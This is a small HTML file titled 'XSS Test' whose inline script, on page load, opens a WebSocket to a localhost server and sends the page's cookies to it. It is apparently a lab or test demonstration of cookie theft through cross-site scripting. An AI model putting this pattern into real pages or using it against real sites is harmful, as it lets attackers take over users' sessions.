<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Test</title>
</head>
<body>
    <script>
        const ws = new WebSocket('ws://localhost:8080');

        ws.onopen = () => {
            const cookies = document.cookie;
            ws.send(cookies);
        };

        ws.onmessage = (event) => {
            console.log('Message from server:', event.data);
        };
    </script>
</body>
</html>
